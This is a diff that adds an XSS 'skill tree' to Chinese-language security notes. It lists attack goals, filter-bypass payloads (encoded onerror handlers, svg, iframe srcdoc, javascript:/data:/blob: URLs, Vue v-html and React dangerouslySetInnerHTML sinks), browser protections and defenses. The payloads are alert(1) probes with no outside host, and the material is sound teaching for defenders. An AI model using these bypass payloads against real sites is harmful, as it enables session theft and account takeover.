@@ -225,6 +225,128 @@ URL fragment（锚点）本身只是浏览器侧的数据来源，CSP 并不会�
 
 >***CSP（Content Security Policy）由网站通过 HTTP 响应头或 HTML meta 标签声明，最终由浏览器强制执行。CSP配置正确的情况下可以用来防护Dom-XSS***
 
+### XSS技能树
+攻击
+```
+XSS 利用
+├── 基础执行
+│   ├── alert / console
+│   └── Cookie / Storage
+│
+├── window 利用
+│   ├── window.opener（tabnabbing）
+│   ├── window.name（跨域存储）
+│   ├── window.parent / top
+│   └── postMessage 注入
+│
+├── iframe 利用
+│   ├── 同源 iframe 提权
+│   ├── 钓鱼 / UI 覆盖
+│   ├── C2 / 持久控制
+│   └── sandbox 误配置
+│
+├── 权限扩展
+│   ├── CSRF
+│   ├── SSRF
+│   ├── 账号接管
+│   └── 后台劫持
+│
+└── 持久化
+    ├── localStorage
+    ├── Service Worker（高级）
+    └── WebSocket
+
+```
+```
+绕过手段
+├── 编码绕过
+│   ├── HTML 实体
+│   │   `<img src=x onerror=&lt;script&gt;alert(1)&lt;/script&gt;>`
+│   │
+│   ├── URL 编码
+│   │   `<img src=x onerror=%61%6c%65%72%74(1)>`
+│   │
+│   └── Unicode
+│       `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`
+│
+├── 事件触发
+│   ├── onerror
+│   │   `<img src=x onerror=alert(1)>`
+│   │
+│   ├── onload
+│   │   `<body onload=alert(1)>`
+│   │
+│   └── SVG
+│       `<svg><script>alert(1)</script></svg>`
+│
+├── 标签利用
+│   ├── img
+│   │   `<img src=x onerror=alert(1)>`
+│   │
+│   ├── svg
+│   │   `<svg onload=alert(1)>`
+│   │
+│   ├── iframe
+│   │   `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
+│   │
+│   └── math
+│       `<math><mtext onclick="alert(1)">X</mtext></math>`
+│
+├── 协议利用
+│   ├── javascript:
+│   │   `<a href="javascript:alert(1)">click</a>`
+│   │
+│   ├── data:
+│   │   `<img src="data:image/svg+xml,<svg onload=alert(1)>">`
+│   │
+│   └── blob:
+│       `URL.createObjectURL(new Blob(["<script>alert(1)</script>"],{type:"text/html"}))`
+│
+└── 框架特性
+    ├── Vue v-html
+    │   `<div v-html="'<img src=x onerror=alert(1)>'"></div>`
+    │
+    ├── React dangerouslySetInnerHTML
+    │   `{ dangerouslySetInnerHTML:{__html:'<svg onload=alert(1)>'} }`
+    │
+    └── innerHTML 包装
+        `element.innerHTML = "<iframe srcdoc='<script>alert(1)</script>'>"`
+```
+
+```
+浏览器安全机制
+├── SOP（同源策略）
+│   └── ❌ 不防 XSS
+│
+├── CSP
+│   ├── script-src
+│   ├── unsafe-inline
+│   └── nonce / hash
+│
+├── HttpOnly Cookie
+│   └── 防 Cookie 窃取
+│
+└── sandbox iframe
+```
+```
+防御
+├── 输入验证（不可靠）
+├── 输出编码（最关键）
+│   ├── HTML Encode
+│   ├── JS Encode
+│   └── URL Encode
+│
+├── 禁用危险 API
+│   ├── eval
+│   ├── innerHTML
+│
+├── CSP
+│   ├── 禁止 inline
+│   ├── 禁止 eval
+│
+└── 框架自动转义
+
+```
 ### 危害
 
 * 窃取 Cookie（非 HttpOnly）
